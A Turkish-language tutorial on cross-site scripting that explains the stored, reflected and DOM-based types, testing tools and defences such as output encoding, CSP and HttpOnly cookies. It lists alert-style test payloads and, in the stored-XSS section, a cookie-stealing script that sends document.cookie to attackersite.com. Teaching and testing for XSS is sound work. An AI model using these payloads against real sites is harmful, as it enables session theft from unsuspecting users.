:
### XSS (Cross-Site Scripting) Nedir?
XSS (Cross-Site Scripting), saldırganların bir web sitesine zararlı JavaScript kodu enjekte etmesine olanak tanıyan bir güvenlik açığıdır. Bu kod, siteyi ziyaret eden diğer kullanıcıların tarayıcılarında çalıştırılır ve oturum çalma, kimlik bilgisi hırsızlığı, keylogger yerleştirme veya kötü amaçlı yönlendirmeler gibi saldırılara sebep olabilir.

## 1️⃣ XSS Türleri
### 1️⃣ Stored XSS (Depolanmış XSS)
### Açıklama: Zararlı JavaScript kodunun kalıcı olarak web sitesine kaydedildiği saldırı türüdür. Kullanıcı siteyi ziyaret ettiğinde kod otomatik olarak çalıştırılır.
### Örnek:
Yorum, mesaj, forum postları gibi kullanıcı tarafından girilen verilerin kaydedilmesi
Profil isimleri, blog içerikleri veya ürün açıklamalarına zararlı kod eklenmesi
Payload Örneği:
Bir yorum alanına aşağıdaki gibi bir XSS payload eklenirse, sayfayı ziyaret eden herkesin tarayıcısında bu kod çalışacaktır:
```html
<script>alert('XSS')</script>
```

- 🔹 Korunma Yöntemleri:
- ✅ Kullanıcı girişlerini HTML encode ile filtrele
- ✅ CSP (Content Security Policy) kullanarak zararlı komutları engelle

### 2️⃣ Reflected XSS (Yansıtılmış XSS)
### Açıklama: Kullanıcının tarayıcısına anında geri dönen XSS türüdür. Saldırgan genellikle zararlı bir link oluşturarak kurbanı bu linke tıklaması için kandırır.
### Örnek:
Arama kutusu, hata mesajları veya URL parametrelerinde işlenen zararlı kodlar
Payload Örneği:
```html
https://target.com/search?q=<script>alert('XSS')</script>
Bu linke tıklayan kişinin tarayıcısında alert() penceresi açılacaktır.
🔹 Korunma Yöntemleri:
✅ Girdi doğrulaması ve filtreleme yap
✅ XSS korumalı framework’ler (React, Angular gibi) kullan
```

### 3️⃣ DOM-Based XSS
### Açıklama: Zararlı JavaScript kodunun tarayıcı tarafından çalıştırıldığı XSS türüdür. Burada saldırı, web sunucusu yerine tarayıcı tarafında (DOM manipülasyonu ile) gerçekleştirilir.
### Örnek:
Bir URL parametresi innerHTML veya document.write() gibi unsurlara aktarılırsa XSS oluşabilir:
```js
var userInput = location.hash.substring(1);
document.write(userInput);
Eğer saldırgan şu URL’yi kurbanla paylaşırsa:
```html
https://target.com/#<script>alert('XSS')</script>
Kurban bu linke girdiğinde XSS çalışacaktır.
🔹 Korunma Yöntemleri:
✅ innerHTML, document.write(), eval() gibi güvenliksiz fonksiyonları kullanma
✅ Kullanıcı girdilerini sanitize et ve encode uygula
```

## 2️⃣ XSS Açığını Tespit Etme
### Manuel Testler:
<script>alert('XSS')</script> gibi payload’ları dene
Burp Suite Repeater kullanarak dinamik alanları test et
DOM manipülasyonu yapan alanları analiz et
### Otomatik Araçlar:
Burp Suite Scanner
XSStrike
DalFox
Nuclei XSS Tarama
```bash
nuclei -t vulnerabilities/xss -u https://target.com
```

## 3️⃣ XSS’ten Korunma Yöntemleri
- ✅ Girdi Doğrulaması: Kullanıcının girdiği verileri kontrol et
- ✅ Çıkışta Filtreleme: HTML encode uygula (<script> yerine &lt;script&gt;)
- ✅ CSP (Content Security Policy) Kullan: Sadece güvenli kaynaklardan script çalıştır
- ✅ HttpOnly ve Secure Cookie Kullan: Oturum çalınmasını engelle

### Sonuç
XSS, web uygulamalarında en yaygın güvenlik açıklarından biri olup saldırganların oturum çalmasına, sayfa içeriğini değiştirmesine veya kullanıcıları zararlı sitelere yönlendirmesine neden olabilir. Bu yüzden girdi doğrulaması, filtreleme ve güvenli kodlama prensipleri ile korunma sağlanmalıdır. 🚀

_______________________________________________________________________________________

### URL ile XSS (Reflected ve DOM-Based XSS) Nedir?
URL ile XSS saldırıları genellikle Reflected XSS ve DOM-Based XSS şeklinde gerçekleşir. Saldırgan, mağdurun tarayıcısında çalışacak kötü niyetli bir JavaScript kodunu URL’ye enjekte eder. Mağdur bu URL’yi açtığında zararlı kod çalışır.

## 1️⃣ Reflected XSS ile URL Üzerinden Saldırı
Reflected XSS, web sunucusunun, URL’den gelen girdiyi filtrelemeden sayfaya yerleştirmesi sonucu oluşur. Kullanıcı URL’deki kötü amaçlı JavaScript içeren bağlantıya tıkladığında tarayıcısında kod çalışır.
### Örnek Zafiyetli URL:
Bir arama kutusu içeren site düşünelim:
```html
https://target.com/search?q=deneme
Sunucu, bu değeri sayfa içine yansıtır:
```html
<p>Arama Sonucu: deneme</p>
Eğer giriş doğrulaması yapılmazsa, URL’ye bir JavaScript kodu enjekte edilebilir:
```html
https://target.com/search?q=<script>alert('XSS')</script>
Bu durumda, site bu girdiyi doğrudan sayfaya eklediğinde saldırı gerçekleşir:
```html
<p>Arama Sonucu: <script>alert('XSS')</script></p>
Sonuç: Kurban bu linke tıklarsa tarayıcısında alert('XSS') açılır.
✅ Test Etmek İçin Kullanılabilecek Payload’lar:
```html
https://target.com/search?q=<script>alert(1)</script>
https://target.com/search?q="><script>alert(1)</script>
https://target.com/search?q=<svg/onload=alert(1)>
https://target.com/search?q=<img src=x onerror=alert(1)>
https://target.com/search?q=<body onload=alert(1)>
```


🛠️ 2️⃣ DOM-Based XSS ile URL Üzerinden Saldırı
DOM-Based XSS, JavaScript’in document.write(), innerHTML, location.href, eval() gibi güvenliksiz fonksiyonları kullanması nedeniyle oluşur. Bu durumda saldırı, sunucu tarafında değil, tarayıcı tarafında gerçekleşir.
### Örnek Güvenlik Açığı:
Aşağıdaki kod, URL’de bulunan msg parametresini alıp sayfaya eklemektedir:
```html
<script>
var message = new URLSearchParams(window.location.search).get("msg");
document.write(message);
</script>
Eğer bir saldırgan şu URL’yi kullanırsa:
```html
https://target.com/index.html?msg=<script>alert('XSS')</script>
Sayfayı ziyaret eden kullanıcının tarayıcısında XSS çalışacaktır.
✅ DOM-Based XSS Test İçin URL Payload’ları:
```html
https://target.com/index.html#<script>alert('XSS')</script>
https://target.com/index.html?msg=<img src=x onerror=alert(1)>
https://target.com/index.html?data=<svg/onload=alert(1)>
https://target.com/index.html?msg=<body onload=alert(1)>
```


🔎 3️⃣ URL ile XSS Açığını Test Etme
- ✅ Burp Suite Repeater ile URL’deki parametreleri test et
- ✅ Manuel Payload Denemeleri yaparak sayfanın çıktısını incele
- ✅ DalFox & XSStrike gibi araçlarla otomatik tarama yap
```bash
dalfox url "https://target.com/search?q=test"
xsstrike -u "https://target.com/search?q=test"
✅ Developer Console’da (F12) JavaScript analizi yap
```js
document.write(location.search);
```


## 4️⃣ XSS Açıklarından Korunma Yöntemleri
- 🚫 Kullanıcı girişlerini doğrudan sayfaya yazdırma!
- ✅ Girdi doğrulaması yap ve özel karakterleri filtrele (<, >, ", ', / gibi karakterleri engelle)
- ✅ HTML encode kullan:
```js
function escapeHTML(str) {
    return str.replace(/[&<>"']/g, function (match) {
        return {
            '&': '&amp;',
            '<': '&lt;',
            '>': '&gt;',
            '"': '&quot;',
            "'": '&#39;'
        }[match];
    });
}
✅ CSP (Content Security Policy) kullanarak yalnızca güvenilir kaynaklardan script çalıştır
✅ HttpOnly ve Secure flag içeren çerezler kullanarak oturum çalınmasını önle
```

### Sonuç
URL ile XSS saldırıları, kullanıcıları kandırarak zararlı kod çalıştırmak için yaygın olarak kullanılan bir yöntemdir. Reflected XSS ve DOM-Based XSS açıklarını önlemek için güvenli kodlama prensipleri uygulanmalı ve uygun koruma yöntemleri alınmalıdır. 🚀
_____________________________________________________________________________________

### Kayıtlı XSS (Stored XSS) Nedir?
Kayıtlı XSS (Stored XSS), saldırganın zararlı JavaScript kodunu bir web sitesinin veritabanına veya kalıcı bir depolama alanına kaydetmesiyle oluşan bir güvenlik açığıdır. Bu tür saldırılar, yorum bölümleri, mesaj panoları, kullanıcı profilleri veya forumlar gibi veri girişlerinin kaydedildiği yerlerde yaygındır.
- ✅ Stored XSS ile saldırı başarılı olursa:
Zararlı kod herkese çalıştırılır.
Kullanıcı tarayıcılarında session çalma, keylogger, phishing saldırıları yapılabilir.
Etkilenen herkes saldırıdan habersiz kalır.

## 1️⃣ Kayıtlı XSS Örneği
Bir web sitesinde yorum ekleyebildiğimiz bir alan olduğunu düşünelim. Kullanıcı, aşağıdaki gibi bir yorum yazarsa:
```html
<script>alert('XSS')</script>
Ve web sitesi bu girdiyi filtrelemeden veritabanına kaydeder ve sayfaya eklerse, tüm ziyaretçiler için JavaScript kodu otomatik olarak çalışır.
📌 Örnek Kötü Amaçlı Girdi
```html
<script>document.location='http://attackersite.com/steal?cookie='+document.cookie</script>
Bu kod, kurbanın çerezlerini saldırgana gönderir.
```

🛠️ 2️⃣ Kayıtlı XSS Açığını Test Etme
- ✅ Kendi yorumlarını kontrol et:
Form alanlarına <script>alert("XSS")</script> gibi payload’lar gir.
Yorum ekle ve sayfa yenilendiğinde çalışıp çalışmadığını kontrol et.
- ✅ Gizli JavaScript çalıştır:
Bazı sitelerde alert() kapalı olabilir, ancak aşağıdaki kodlar çalışabilir:
```html
<script>console.log("XSS Test")</script>
<img src=x onerror=alert('XSS')>
<svg/onload=alert('XSS')>
Eğer yukarıdaki kodlar çalışıyorsa Stored XSS açığı var demektir.
✅ Burp Suite Proxy ile HTTP requestleri analiz et:
Form verilerini Intercept (yakala) yaparak sunucuya gönderilen POST/GET isteklerini incele.
XSS payload’larını farklı alanlara enjekte ederek sitenin nasıl tepki verdiğini kontrol et.
✅ Automated XSS Scan (Otomatik Tarama) için Araçlar Kullan:
DalFox:
```bash
dalfox url "https://target.com/comment"
XSStrike:
```bash
xsstrike -u "https://target.com/comment"
```

## 3️⃣ Kayıtlı XSS Açıklarından Korunma Yöntemleri
- ✅ Girdi Doğrulama ve Filtreleme:
HTML encode yap: Kullanıcının girdiği <script> gibi etiketleri &lt;script&gt; olarak dönüştür.
Girdi uzunluğu sınırlı olsun: <script> gibi zararlı kod eklemek için uzun metinler gereklidir.
Yalnızca izin verilen karakterleri kullan: Örneğin, yorum alanına sadece harf, sayı ve belirli noktalama işaretlerini eklemeye izin ver.
- ✅ Çıktı Temizleme (Output Encoding):
Kullanıcının girdiği verileri innerHTML, document.write gibi fonksiyonlarla doğrudan eklemeyin!
Bunun yerine textContent veya innerText kullanın:
```js
document.getElementById("comment").textContent = userInput;
✅ CSP (Content Security Policy) Kullan:
Yalnızca belirli kaynaklardan JavaScript çalıştırılmasını sağlamak için CSP ekleyin.
```html
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' https://trusted-source.com;">
✅ HttpOnly ve Secure Çerez Kullanımı:
Çerezleri HttpOnly olarak ayarlayarak JavaScript ile okunmasını engelleyin:
```bash
Set-Cookie: session=xyz; HttpOnly; Secure
```

### Sonuç
Kayıtlı XSS, kalıcı ve tehlikeli bir açık olup, saldırganın zararlı kodu bir defa enjekte ettikten sonra her kullanıcıyı etkileyebildiği bir saldırıdır. Güvenli kodlama, çıktı temizleme ve CSP kullanımı ile bu tür saldırılar önlenebilir. 🚀
______________________________________________________________________________________
## XSS'ten Korunma Yöntemleri
XSS (Cross-Site Scripting) saldırılarından korunmak için girdi doğrulama, çıktı temizleme ve güvenlik önlemleri almak gereklidir. İşte XSS'ten korunmak için almanız gereken önlemler:

### 1️⃣ Kullanıcı Girdilerini Doğrulayın ve Filtreleyin
Kullanıcıdan gelen her veriyi güvenli kabul etmeyin!
Yalnızca izin verilen karakterleri kabul edin. (Beyaz liste yöntemi)
HTML etiketlerini temizleyin veya encode edin.


Örnek (Python – Flask)
```python
from markupsafe import escape  
@app.route("/comment", methods=["POST"])
def comment():
    user_input = escape(request.form["comment"])  # HTML encode
    return f"Yorum kaydedildi: {user_input}"
✅ escape() fonksiyonu zararlı HTML etiketlerini &lt;script&gt; gibi encode eder.
Örnek (PHP)
```php
$user_input = htmlspecialchars($_POST["comment"], ENT_QUOTES, 'UTF-8');
✅ htmlspecialchars() zararlı karakterleri HTML olarak encode eder.
```

### 2️⃣ Çıktı Temizleme (Output Encoding)
Kullanıcı girdisini doğrudan sayfaya eklemeyin!
innerHTML, document.write() gibi fonksiyonlar yerine textContent veya innerText kullanın.
Örnek (JavaScript)
```js
document.getElementById("comment").textContent = userInput;
✅ textContent doğrudan HTML yerine sadece metin olarak ekler.
```

### 3️⃣ Güçlü Content Security Policy (CSP) Kullanın
CSP, tarayıcının belirli kaynaklardan gelen scriptleri engellemesini sağlar.
Örnek (Meta Tag ile CSP)
```html
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' https://trusted-cdn.com;">
✅ Yalnızca belirli kaynaklardan JavaScript çalıştırılmasını sağlar.
Örnek (HTTP Header ile CSP)
```bash
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted-scripts.com
```

4️⃣ HttpOnly ve Secure Çerezleri Kullanın
XSS saldırıları genellikle çerez çalmak için yapılır. HttpOnly çerezler JavaScript ile erişilemez.
Örnek (Set-Cookie Header)
```bash
Set-Cookie: session=xyz; HttpOnly; Secure
```

- ✅ HttpOnly çerezleri JavaScript ile okunamaz.
- ✅ Secure sadece HTTPS üzerinden gönderir.

5️⃣ Güvenli JavaScript Kullanımı
eval(), document.write(), setInnerHTML() gibi fonksiyonlardan kaçının!
Eğer JSON verisi işleniyorsa, JSON.parse() kullanın, eval() kullanmayın!
Yanlış Kullanım (XSS Açığı Var)
```js
var userInput = "<script>alert('XSS')</script>";
document.body.innerHTML = userInput;  // XSS saldırısına açık
Doğru Kullanım
```js
document.body.textContent = userInput;  // Güvenli
```


6️⃣ Web Uygulama Güvenlik Duvarı (WAF) Kullanın
Cloudflare, AWS WAF, ModSecurity gibi güvenlik duvarları zararlı XSS payload'larını engelleyebilir.

### Sonuç
XSS saldırılarından korunmak için girdi doğrulama, çıktı temizleme, CSP, güvenli çerezler ve güvenli kodlama yöntemlerini uygulamak gerekir. 🚀



